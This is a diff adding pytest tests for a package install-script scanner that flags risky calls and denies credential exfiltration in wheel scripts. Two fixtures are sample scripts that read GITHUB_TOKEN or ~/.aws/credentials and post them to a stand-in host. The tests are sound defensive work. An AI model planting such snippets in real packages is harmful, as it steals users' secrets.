@@ -32,6 +32,139 @@ def test_setup_py_subprocess_is_denied(make_sdist) -> None:
     assert any(item.action == "DENY" for item in findings)
 
 
+def test_wheel_install_script_safe_python_has_general_review_only(make_wheel) -> None:
+    artifact = make_wheel(
+        {"demo-1.0.0.data/scripts/demo-tool": "#!/usr/bin/env python3\nprint('ok')\n"}
+    )
+    findings = scan_install_surface(str(artifact))
+    assert [item.rule for item in findings] == ["wheel_install_script"]
+    assert findings[0].action == "REVIEW"
+
+
+@pytest.mark.parametrize(
+    ("filename", "source"),
+    [
+        ("process", "import subprocess\nsubprocess.run(['echo', 'x'])\n"),
+        ("network", "import requests\nrequests.get('https://example.test')\n"),
+        ("dynamic", "eval('1 + 1')\n"),
+        ("write", "open('output.txt', 'w').write('x')\n"),
+    ],
+)
+def test_wheel_install_script_risky_calls_are_reviewed(make_wheel, filename, source) -> None:
+    artifact = make_wheel({f"demo-1.0.0.data/scripts/{filename}.py": source})
+    findings = scan_install_surface(str(artifact))
+    assert "wheel_install_script" in _rules(findings)
+    risky = [item for item in findings if item.rule == "wheel_install_script_risky"]
+    assert len(risky) == 1
+    assert risky[0].action == "REVIEW"
+    assert risky[0].line >= 1
+
+
+def test_wheel_install_script_credential_network_is_denied_without_risky_duplicate(
+    make_wheel,
+) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/send": (
+                "#!/usr/bin/env python3\n"
+                "import os\nimport requests\n"
+                "token = os.getenv('GITHUB_TOKEN')\n"
+                "requests.post('https://example.test', data=token)\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    flows = [item for item in findings if item.rule == "wheel_install_script_credential_network"]
+    assert len(flows) == 1
+    assert flows[0].action == "DENY"
+    assert flows[0].source == "os.getenv('GITHUB_TOKEN')"
+    assert flows[0].sink == "requests.post"
+    assert not any(
+        item.rule == "wheel_install_script_risky" and item.line == flows[0].line
+        for item in findings
+    )
+
+
+def test_wheel_install_script_file_credential_network_is_denied(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/send.py": (
+                "import requests\n"
+                "token = open('~/.aws/credentials').read()\n"
+                "requests.post('https://example.test', data=token)\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    flow = next(item for item in findings if item.rule == "wheel_install_script_credential_network")
+    assert flow.source == "~/.aws/credentials"
+    assert flow.sink == "requests.post"
+
+
+def test_non_python_wheel_install_script_has_general_review_only(make_wheel) -> None:
+    artifact = make_wheel({"demo-1.0.0.data/scripts/tool.bin": b"\x00\x01binary"})
+    findings = scan_install_surface(str(artifact))
+    assert [item.rule for item in findings] == ["wheel_install_script"]
+
+
+@pytest.mark.parametrize(
+    "shebang",
+    [
+        "#!python",
+        "#!pythonw",
+        "#!/usr/bin/env python",
+        "#!/usr/bin/env python3",
+        "#!/opt/bin/python.exe",
+    ],
+)
+def test_wheel_install_script_python_shebang_is_parsed(make_wheel, shebang: str) -> None:
+    artifact = make_wheel({"demo-1.0.0.data/scripts/tool": f"{shebang}\nexec('x')\n"})
+    findings = scan_install_surface(str(artifact))
+    assert any(item.rule == "wheel_install_script_risky" for item in findings)
+
+
+def test_wheel_install_script_parse_failure_keeps_general_review(make_wheel) -> None:
+    artifact = make_wheel({"demo-1.0.0.data/scripts/tool.py": "def broken(:\n"})
+    findings = scan_install_surface(str(artifact))
+    assert {"wheel_install_script", "ast_parse_failed"} <= _rules(findings)
+    assert "wheel_install_script_risky" not in _rules(findings)
+
+
+def test_sdist_install_script_like_path_is_ignored(make_sdist) -> None:
+    artifact = make_sdist({"demo-1.0.0.data/scripts/tool.py": "import subprocess\n"})
+    assert "wheel_install_script" not in _rules(scan_install_surface(str(artifact)))
+
+
+def test_nested_or_lookalike_wheel_script_path_is_ignored(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "pkg/demo-1.0.0.data/scripts/tool.py": "import subprocess\n",
+            "demo-1.0.0.data/scripts/nested/tool.py": "import subprocess\n",
+            "demo-1.0.0.dat/scripts/tool.py": "import subprocess\n",
+        }
+    )
+    assert "wheel_install_script" not in _rules(scan_install_surface(str(artifact)))
+
+
+def test_wheel_install_script_setup_py_is_not_build_setup(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/setup.py": (
+                "import subprocess\nsubprocess.run(['echo', 'installed'])\n"
+            )
+        }
+    )
+    rules = _rules(scan_install_surface(str(artifact)))
+    assert "wheel_install_script" in rules
+    assert "wheel_install_script_risky" in rules
+    assert not any(rule.startswith("setup_py_") for rule in rules)
+
+
+def test_sdist_common_root_setup_py_remains_build_setup(make_sdist) -> None:
+    artifact = make_sdist({"setup.py": "import subprocess\nsubprocess.run(['echo', 'x'])\n"})
+    assert "setup_py_process" in _rules(scan_install_surface(str(artifact)))
+
+
 def test_setup_network_cmdclass_and_file_write_rules(make_sdist) -> None:
     artifact = make_sdist(
         {
